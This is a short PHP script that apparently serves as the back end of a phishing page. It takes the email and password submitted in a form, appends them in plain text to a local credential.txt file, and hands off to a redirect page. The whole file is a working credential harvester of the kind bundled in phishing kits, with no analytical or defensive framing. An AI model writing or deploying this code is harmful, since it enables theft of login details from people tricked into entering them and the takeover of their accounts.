<?php
        $mail = $_POST["email"];
        $password = $_POST["password"];
        $cred = 'Mail: '.$mail.'       Password: '. $password.PHP_EOL;
         
         $file = file_put_contents('./credential.txt', $cred.PHP_EOL, FILE_APPEND | LOCK_EX);
         include("redirect.php");
         
      ?>
